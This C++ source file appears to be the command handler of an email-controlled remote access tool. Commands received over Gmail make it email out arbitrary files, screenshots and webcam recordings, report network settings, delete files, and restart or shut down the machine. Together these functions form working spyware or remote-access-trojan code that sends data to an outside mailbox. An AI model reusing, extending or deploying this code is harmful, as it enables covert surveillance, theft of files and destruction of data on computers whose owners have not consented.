#include <winsock2.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include <sstream>  
#include "../gmailSender/gmailSender.hpp"
#include "../commandHelper/commandHelper.hpp"
#include "../commandHelper/ipconfig.hpp"
#include "../commandHelper/screencapture.hpp"
#include "../commandHelper/getfile.hpp"
#include "../commandHelper/deletefile.hpp"
#include "../commandHelper/webcam.hpp"

void helpCommand(const string& command, const string& accessToken, const string& sender){
    cout << "NOTE: " << command << " command was received" << endl;
    cout << "________________________________________________" <<endl;
    cout << "help: To print this table" << endl;
    cout << "command --help: To know how to use a command" << endl;
    cout << "ipconfig: To view the network settings on this computer" << endl;
    cout << "getfile: To take a file from computer" << endl;
    cout << "deletefile: To delete a file from computer" << endl;
    cout << "screencap: To take a screenshot from computer" << endl;
    cout << "webcam: To take a vid from computer's webcam" << endl;
    cout << "SEND_EMAIL: To send an email by computer gmail" << endl;
    cout << "________________________________________________" <<endl;
    string body = R"(Try*
        help: To print this table
        command --help: To know how to use a command
        ipconfig: To view the network settings on this computer
        getfile: To take a file from computer
        deletefile: To delete a file from computer
        screencap: To take a screenshot from computer
        webcam: To take a vid from computer's webcam
        SEND_EMAIL: To send an email by computer gmail)";
    if (sendEmail(sender, body, accessToken)) {
        cout << "Email sent successfully to " << sender << endl;
    } else {
        cout << "Failed to send email." << endl;
    }
    cout << "_______________________________________________________________" <<endl;
    cout << endl;
}

void ipconfigCommand(const string& command, const string& accessToken, const string& sender){
    cout << "NOTE: " << command << " command was received" << endl;
    cout << "________________________________________________" << endl;
    cout << endl;
    string body = PrintAdapterInfo();
    cout << body << endl;
    cout << "________________________________________________" <<endl;
    if (sendEmail(sender, body, accessToken)) {
        cout << "Email sent successfully to " << sender << endl;
    } else {
        cout << "Failed to send email." << endl;
    }
    cout << "_______________________________________________________________" <<endl;
    cout << endl;
}

void screenCaptureCommand(const string& command, const string& accessToken, const string& sender){
    cout << "NOTE: " << command << " command was received" << endl;
    cout << "________________________________________________" << endl;
    cout << endl;
    CaptureScreen(L"screenshot.bmp");
    cout << "________________________________________________" <<endl;
    string body = "Here is the screenshot attached.";

    // Gửi email với hình ảnh đính kèm
    if(sendEmailWithAttachment(sender, body, accessToken, "../Source/screenshot.bmp", "screenshot.bmp")) {
        cout << "Email sent successfully to " << sender << endl;
    } else {
        cout << "Failed to send email." << endl;
    }
    cout << "_______________________________________________________________" <<endl;
    cout << endl;
}

// Lenh getfil
void getFileCommand(const string& accessToken, const string& sender){
    cout << "NOTE: getfile command was received" << endl;
    cout << "________________________________________________" << endl;
    cout << endl;
    
    string body = "getfile require path to the file\n\nTry: getfile -p <path_to_the_file_you_need>";

    if (sendEmail(sender, body, accessToken)) {
        cout << "Email sent successfully to " << sender << endl;
    } else {
        cout << "Failed to send email." << endl;
    }
    cout << "______________________________________________________________" << endl;
    cout << endl;
}
void getFileCommand(const string& command, const string& accessToken, const string& sender){
    cout << "NOTE: getfile command was received" << endl;
    cout << "________________________________________________" << endl;
    cout << endl;

    string filePath = extractPath(command);
    cout << "get " << filePath << endl;
    string body = getFileAtPath(filePath);
    size_t pos = filePath.find_last_of("\\/");
    string fileName = filePath.substr(pos + 1);
    if (sendEmailWithAttachment(sender, body, accessToken, filePath, fileName)) {
        cout << "Email sent successfully to " << sender << endl;
    } else {
        cout << "Failed to send email." << endl;
    }
    cout << "______________________________________________________________" << endl;
    cout << endl;
}

// Lenh xoa file
void deleteFileCommand(const string& accessToken, const string& sender){
    cout << "NOTE: deletefile command was received" << endl;
    cout << "________________________________________________" << endl;
    cout << endl;
    
    string body = "delete file require path to the file\n\nTry: deletefile -p <path_to_the_file_you_need>";

    if (sendEmail(sender, body, accessToken)) {
        cout << "Email sent successfully to " << sender << endl;
    } else {
        cout << "Failed to send email." << endl;
    }
    cout << "______________________________________________________________" << endl;
    cout << endl;
}
void deleteFileCommand(const string& command, const string& accessToken, const string& sender){
    cout << "NOTE: deletefile command was received" << endl;
    cout << "________________________________________________" << endl;
    cout << endl;

    string filePath = extractPathForDel(command);
    cout << "delete " << filePath << endl;
    string body = deleteFileAtPath(filePath);

    if (sendEmail(sender, body, accessToken)) {
        cout << "Email sent successfully to " << sender << endl;
    } else {
        cout << "Failed to send email." << endl;
    }
    cout << "______________________________________________________________" << endl;
    cout << endl;
}

//Lenh mo webcam
void webcamRecorder(const string& accessToken, const string& sender){
    cout << "NOTE: webcam command was received" << endl;
    cout << "________________________________________________" << endl;
    cout << endl;
    
    string body = "webcam require time to stop \n\nTry: webcam -t <time(s)>";

    if (sendEmail(sender, body, accessToken)) {
        cout << "Email sent successfully to " << sender << endl;
    } else {
        cout << "Failed to send email." << endl;
    }
    cout << "______________________________________________________________" << endl;
    cout << endl;
}

void webcamRecorder(const string & command, const string& accessToken, const string& sender){
    cout << "NOTE: webcam command was received" << endl;
    cout << "________________________________________________" << endl;
    cout << endl;

    int time = extractTimeForWebcam(command);
    cout << "webcam in " << time << "s" << endl;
    captureVideo("webcamVid.avi", time);
    cout << "________________________________________________" << endl;
    string body = "Here your file";
    if (sendEmailWithAttachment(sender, body, accessToken, "../Source/webcamVid.avi", "webcamVid.avi")) {
        cout << "Email sent successfully to " << sender << endl;
    } else {
        cout << "Failed to send email." << endl;
    }
    cout << "______________________________________________________________" << endl;
    cout << endl;
}

void sendEmailCommand(const string& command, const string& accessToken, const string& sender){
    cout << "NOTE: SEND_EMAIL command was received" << endl;
    cout << "________________________________________________" << endl;
    cout << endl;
    
    string body = "This is a test email sent from the C++ program.";

    if (sendEmail(sender, body, accessToken)) {
        cout << "Email sent successfully to " << sender << endl;
    } else {
        cout << "Failed to send email." << endl;
    }
    cout << "______________________________________________________________" << endl;
    cout << endl;
}

void unknownCommand(const string& command, const string& accessToken, const string& sender){
    cout << "NOTE: UNKNOWN COMMAND: " << command << endl;
    cout << "** Try \n  \"help\" for more infomations" << endl; 
    cout <<"_________________________________________________" << endl;
    cout << endl;

    // send response
    string body = "...Unknown command!!\n Wat de fuk have you sent\n\n** Try \n  \"help\" for more infomations";

    if (sendEmail(sender, body, accessToken)) {
        cout << "Email sent successfully to " << sender << endl;
    } else {
        cout << "Failed to send email." << endl;
    }
    cout << "______________________________________________________________" << endl;
    cout << endl;
    return;
}
void restartCommand(const string& command, const string& accessToken, const string& sender){
    cout << "NOTE: " << command << " command was received" << endl;
    cout << "________________________________________________" << endl;
    cout << endl;
    system("shutdown /r /t 0");
    cout << "________________________________________________" <<endl;
}

void shutdownCommand(const string& command, const string& accessToken, const string& sender){
    cout << "NOTE: " << command << " command was received" << endl;
    cout << "________________________________________________" << endl;
    cout << endl;
    system("shutdown /s /t 0");
    cout << "________________________________________________" <<endl;
}

void refreshToken(){
    cout << "...REFRESHINGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG" << endl;
    cout << endl;
    cout << "NOTE: Acess token is expired, the new access token will be take soon..." << endl;
    cout << "______________________________________________________________" << endl;
    cout << endl;
    return;
}

void waiting(){
    cout << "...WAITINGGGGGGGG" << endl;
    cout << "NOTE: No message found" << endl;
    cout << "______________________________________________________________" << endl;
    cout << endl;
    return;
}